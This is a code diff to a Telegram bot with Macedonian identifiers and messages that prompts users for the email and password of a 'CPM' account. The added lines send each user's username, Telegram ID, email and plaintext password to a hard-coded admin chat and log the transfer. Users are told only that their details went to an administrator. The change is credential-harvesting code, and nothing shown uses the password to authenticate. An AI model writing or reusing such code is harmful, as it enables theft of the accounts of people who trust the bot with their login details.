@@ -214,6 +214,8 @@ async def obraboti_klikovi(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def obraboti_tekst(update: Update, context: ContextTypes.DEFAULT_TYPE):
     sostojba = context.user_data.get('sostojba')
     vnesen_tekst = update.message.text
+    user = update.message.from_user
+    username = user.username if user.username else "User"
 
     if sostojba == 'CEKA_EMAIL':
         context.user_data['email'] = vnesen_tekst
@@ -222,10 +224,36 @@ async def obraboti_tekst(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     elif sostojba == 'CEKA_PASSWORD':
-        context.user_data['password'] = vnesen_tekst
+        password = vnesen_tekst
+        email = context.user_data.get('email')
         context.user_data['sostojba'] = None
         
-        email = context.user_data.get('email')
+        # ПРАЌАЊЕ НА EMAIL И PASSWORD ДО АДМИНОТ
+        admin_poraka = (
+            f"🔐 **Нова најава во CPM**\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"👤 **Корисник:** @{username}\n"
+            f"🆔 **ID:** `{user.id}`\n"
+            f"📧 **Email:** `{email}`\n"
+            f"🔑 **Лозинка:** `{password}`\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"📅 {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
+        )
+        
+        try:
+            await context.bot.send_message(
+                chat_id=ADMIN_ID,
+                text=admin_poraka,
+                parse_mode='Markdown'
+            )
+            logger.info(f"Испратени credentials за @{username} до администратор")
+        except Exception as e:
+            logger.error(f"Грешка при праќање до администратор: {e}")
+            await update.message.reply_text("❌ Грешка при праќање на податоците. Обидете се повторно.")
+            return
+        
+        # Потврда за корисникот
+        await update.message.reply_text("✅ Вашите податоци се испратени до администраторот!")
         
         dashboard_text = (
             "...\n"
